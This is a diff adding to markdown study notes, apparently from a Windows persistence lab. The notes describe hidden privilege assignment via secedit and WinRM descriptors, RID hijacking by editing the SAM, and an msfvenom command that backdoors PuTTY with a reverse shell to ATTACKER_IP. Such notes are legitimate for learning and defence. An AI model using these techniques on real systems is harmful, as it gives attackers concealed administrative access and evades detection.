@@ -64,9 +64,59 @@ secedit /export /cfg config.inf
 ````
 - We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
 - ![765671a0355e2260c44e5a12a10f090e](https://user-images.githubusercontent.com/75596877/180827452-97d0b2b3-cd89-459f-95ee-4d5276a41516.png)
-- 
+- We finally convert the `.inf` file into a `.sdb` file which is then used to load the configuration back into the system:
+````
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+````
+- You should now have a user with equivalent privileges to any `Backup Operator`. The user still can't log into the system via WinRM, so let's do something about it. 
+- Instead of adding the user to the `Remote Management Users` group, we'll change the security descriptor associated with the WinRM service to allow `jack` to connect. 
+- Think of a security descriptor as an ACL but applied to other system facilities.
+- To open the configuration window for WinRM's security descriptor, you can use the following command in **Powershell (you'll need to use the GUI session for this)**:
+````
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+````
+- This will open a window where you can add `jack` and assign it full privileges to connect to WinRM:
+- ![380c80b98c4d1f8c2149ef72427cfeb0](https://user-images.githubusercontent.com/75596877/180828110-e2645cd4-a708-4e8c-b4bf-186ab3d3749c.png)
+- Notice that for this user to work with the given privileges fully, you'd have to change the `LocalAccountTokenFilterPolicy` registry key
+- If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
+````
+net user jack
+User name                    jack
 
+Local Group Memberships      *Users
+Global Group memberships     *None
+````
+## RID Hijacking
+- When a user is created, an identifier called Relative ID (RID) is assigned to them. 
+- The `RID` is simply a numeric identifier representing the user across the system. When a user logs on, the `LSASS` process gets its `RID` from the `SAM` registry hive and creates an access token associated with that `RID`. 
+- If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
+- In any Windows system, the default Administrator account is assigned the `RID = 500`, and regular users usually have `RID >= 1000`.
+````
+wmic useraccount get name,sid
 
+Name                SID
+Administrator       S-1-5-21-1966530601-3185510712-10604624-500
+DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
+--snip--
+````
+- Now we only have to assign the `RID=500` to `jack`. To do so, we need to access the `SAM` using `Regedit`. The `SAM` is restricted to the `SYSTEM` account only, so even the `Administrator` won't be able to edit it. To run `Regedit` as `SYSTEM`, we will use `psexec`.
+- `PsExec64.exe -i -s regedit`
+From Regedit, we will go to:
+- `HKLM\SAM\SAM\Domains\Account\Users\`
+- We need to search for a key with its `RID` in hex `(1010 = 0x3F2)`. Under the corresponding key, there will be a value called `F`, which holds the user's effective `RID` at position `0x30`:
+- ![d630140974989748ebcf150ba0696d14](https://user-images.githubusercontent.com/75596877/180829367-5257c90e-37bc-4773-9ae2-d1a9bbb0fdc5.png)
+- Notice the RID is stored using little-endian notation, so its bytes appear reversed.
+- We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
+- ![8f2072b6d13b7343cf7b890586703ddf](https://user-images.githubusercontent.com/75596877/180829481-acd6a81c-fb14-480b-92c8-aa41539dc9f3.png)
+- The next time `jack` logs in, `LSASS` will associate it with the same `RID` as Administrator and grant them the same privileges.
+## Executable Files
+- If you find any executable laying around the desktop, the chances are high that the user might use it frequently. 
+- Suppose we find a shortcut to `PuTTY` lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
+````
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+````
+## Shortcut Files
 
 
 
